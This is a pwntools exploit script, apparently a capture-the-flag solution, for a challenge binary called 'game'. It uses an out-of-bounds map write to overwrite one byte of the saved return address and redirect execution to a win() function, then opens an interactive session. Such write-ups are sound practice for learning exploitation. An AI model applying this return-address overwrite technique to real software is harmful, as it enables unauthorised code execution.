#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template game
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'game')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.HOST and args.PORT:
        return remote(args.HOST, args.PORT, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        No PIE (0x8048000)
# Stripped:   No

log.info("""challenge is roughly the same as babygame01, but there's no explicit call win() anywhere.

we can, however, use the arbitrary write to smash the saved eip and ret2win easily, as win() is only one
byte off from the saved eip when in move_player.

the math here looks like this:
&map       = 0xffffc8c3
&saved_eip = 0xffffc89c
&arb_write = &map + (y * 0x5a) + x

we need to underflow then move our ptr back up so if we set y=-1, x=51

&arb_write = 0xffffc8c3 + (-1 * 0x5a) + 51 = 0xffffc89c

*saved_eip = 0x08049709
&win       = 0x0804975d

so a 1 byte write will ret2win. setting the player char to chr(0x5d) = ']' wins

for whatever reason, on the real server, 0x0804975d causes a crash, so lets jmp a little further in to chr(0x79) = 'y'

also this is kind of unstable idk why who cares just run it a few times.

""")

STARTX  = 4
STARTY  = 6
WINX    = 51
WINY    = -1
UP      = b'w'
EAST    = b'd'
SETBYTE = b'l' + bytes([0x79,]) # b'l]' to get our overwrite


io = start()

io.sendline(SETBYTE)

for _ in range(abs(WINX-STARTX)):
    io.sendline(EAST)

for _ in range(abs(WINY-STARTY)):
    io.sendline(UP)

io.interactive()
